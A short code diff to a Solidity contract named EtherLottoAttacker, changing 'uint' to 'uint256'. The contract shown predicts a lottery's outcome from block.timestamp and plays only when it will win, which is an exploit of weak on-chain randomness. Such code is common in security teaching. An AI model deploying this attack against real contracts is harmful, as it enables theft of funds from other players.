@@ -10,7 +10,7 @@ contract EtherLottoAttacker {
     }
 
     function play() payable returns (bool) {
-        uint random = uint(sha3(block.timestamp)) % 2;
+        uint256 random = uint256(sha3(block.timestamp)) % 2;
         if (random == 0) {
             target.play.value(msg.value)();
             return true;
